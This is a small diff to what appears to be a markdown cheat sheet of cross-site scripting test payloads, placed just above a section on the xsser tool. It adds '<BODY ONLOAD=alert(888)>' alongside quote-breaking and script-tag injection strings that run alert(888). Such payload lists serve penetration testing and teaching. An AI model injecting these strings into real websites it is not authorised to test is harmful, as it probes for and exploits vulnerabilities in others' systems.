@@ -45,6 +45,7 @@ a";alert(888);"
 a';alert(888);//
 a';alert(888);'
 /"><script>alert(888)</script>
+<BODY ONLOAD=alert(888)>
 ```
 
 ## xsser
